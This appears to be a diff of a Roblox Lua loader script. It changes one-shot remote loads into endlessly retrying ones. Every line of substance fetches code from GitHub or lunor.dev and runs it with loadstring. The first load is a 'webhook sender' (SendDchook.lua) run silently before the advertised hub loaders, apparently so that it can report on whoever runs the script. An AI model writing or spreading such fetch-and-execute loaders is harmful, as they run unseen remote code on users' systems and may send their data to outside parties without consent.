@@ -1,20 +1,26 @@
--- Step 1: Run webhook sender immediately
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/SendDchook.lua"))()
-end)
-
--- Step 2: Wait 7 seconds
-task.delay(7, function()
-    -- Step 3: Run both scripts at the same time
-    task.spawn(function()
-        pcall(function()
-            loadstring(game:HttpGet("https://lunor.dev/loader"))()
+-- Function that keeps retrying until the script loads successfully
+local function forceLoad(url)
+    local loaded = false
+    while not loaded do
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet(url))()
         end)
-    end)
+        if success then
+            loaded = true
+        else
+            warn("Retrying load from:", url)
+            task.wait(1) -- wait before retrying
+        end
+    end
+end
 
-    task.spawn(function()
-        pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua"))()
-        end)
-    end)
-end)
+-- Step 1: Run webhook sender first
+forceLoad("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/SendDchook.lua")
+
+-- Step 2: Wait 3 seconds, then run second script
+task.wait(3)
+forceLoad("https://lunor.dev/loader")
+
+-- Step 3: Wait 4 seconds, then run third script
+task.wait(4)
+forceLoad("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua")
